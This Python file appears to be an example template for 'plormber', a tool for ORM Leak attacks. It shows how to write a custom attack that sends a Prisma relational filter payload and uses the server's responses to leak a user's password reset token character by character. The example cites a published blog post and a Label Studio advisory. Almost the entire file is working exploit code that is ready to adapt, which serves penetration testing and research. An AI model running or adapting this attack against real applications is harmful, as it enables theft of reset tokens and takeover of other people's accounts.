from argparse import ArgumentParser
from requests import Response

# Imports the base ORM Leak attack class
from plormber.attacks.base import BaseORMLeakAttack
# Imports the method for running the custom ORM Leak attack
from plormber.cli.run import run_custom_attack

class ExampleORMLeak(BaseORMLeakAttack):
    # Name of the attack
    command_name = "example-attack"
    # Description for the attack
    command_description = "Some description for the attack"

    def __init__(self, example_arg: str = '', **kwargs):
        """
        Initialises an attack instance
        Done by keyword arguments that are parsed from the command line

        Arg:
            example_arg: An example custom argument
            **kwargs: Command arguments for parent classes
        """
        # Pass off parent command arguments to the parent classes
        super().__init__(**kwargs)
        # Do stuff custom command arguments
        self.example_arg = example_arg


    @classmethod
    def add_options(cls, parser: ArgumentParser) -> ArgumentParser:
        """
        Add custom options for an attack using argparse.ArgumentParser
        """
        # Parse parent class arguments first
        parser = super().add_options(parser)

        # Add custom command arguments
        # IMPORTANT! The names of the command arguments have to be the 
        # same as the keyword arguments for __init__ 
        parser.add_argument(
            '--example-arg',
            help='An example custom argument',
            required=False,
            type=str
        )

        return parser


    def pre_checks(self):
        """
        Checks that are performed before exploitation.

        Add your checks here to verify an endpoint is vulnerable before exploiting.

        Raises:
            Exception: An exception if a pre-check failed
        """


    def handle_pre_check_fail(self, exception: Exception):
        """
        Handler for when a pre-check fails

        Args:
            exception: the raised exception
        """
        print("something goofed!")
        print(exception)


    def create_payload(self, test_value: str) -> list | dict | str:
        """
        Creates the ORM Leak payload to send to the target server

        Args:
            test_value: The string value to test if sensitive contains/starts with this value

        Returns:
            The payload to send to the target
        """
        # Example for https://www.elttam.com/blog/plormbing-your-prisma-orm/#basic-relational-filtering-attack
        payload = {
            "query": {
                "createdBy": {
                    "resetToken": {
                        "startsWith": test_value
                    }
                }
            }
        }
        return payload


    def send_request(self, payload: list | str | dict) -> Response:
        """
        How to send the request to the target instance
        IMPORTANT! Use self.request for sending requests

        Args:
            payload: The ORM Leak payload to send to the target

        Returns:
            A requests Response
        """
        # You can also do additional requests here if the ORM Leak oracle is observed in a
        # separate request than the request that sets the payload.
        #
        # A good example of this is https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw

        # Example for https://www.elttam.com/blog/plormbing-your-prisma-orm/#basic-relational-filtering-attack
        return self.request('POST', self.target, json=payload)
    

    def was_success_result(self, resp: Response) -> bool:
        """
        Checks if the response indicated a successful attempt at leaking the next character

        Args:
            resp: The response from the request testing for a character

        Returns:
            True if the response indicated a hit
        """

        # Example for https://www.elttam.com/blog/plormbing-your-prisma-orm/#basic-relational-filtering-attack
        return len(resp.json()) > 0

# Runs the custom attack
if __name__ == "__main__":
    run_custom_attack(ExampleORMLeak)